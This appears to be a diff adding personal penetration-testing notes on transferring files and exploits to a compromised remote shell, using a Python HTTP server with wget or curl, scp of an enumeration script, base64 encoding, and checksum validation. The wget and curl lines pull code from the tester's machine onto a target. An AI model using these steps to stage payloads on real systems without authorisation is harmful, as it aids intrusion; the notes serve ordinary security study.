@@ -1,0 +1,28 @@
+Often times you'll need to send files or exploits to the remote shell
+
+- Using Wget/Curl:
+    - Run a python HTTP server on our machine then wget or cURL to download the file from the remote host.
+    - Step 1: Go into directory with the file we want to send.
+    - Step 2: python3 -m http.server 8000
+    - Step 3: Go to remote host, run command: wget http://[our pc ip]:8000/[file]
+        - Alternatively if the host doesnt have wget, curl http://[our pc ip]:8000/[file] -o [file]
+
+
+- Using SCP:
+    - If we have ssh user creds on the remote host, we can do: 
+        - scp linenum.sh user@remotehost:[path]
+
+- Using Base64
+    - If you can't transfer the file, we can do some shenanigans and base64 encode the file into base64 format, then past ethe base64 string on the remote server and then decode it there. 
+
+    - Step 1: base64 [file] -w 0
+    - Step 2: Now we can copy this string, then go to the remote host, and use base64 -d to decode it, and pipe that into a file.
+        - echo [string] | base64 -d > [file]
+    
+
+- File Validation:
+    - To validate the format of a file, you can run the file command on it:
+        - file [file]
+    
+    - To ensure we didn't fuck up the file, check it's hash against your pc's file hash.
+        - compare md5sum [file] hashes on both the remote server, and the home server.
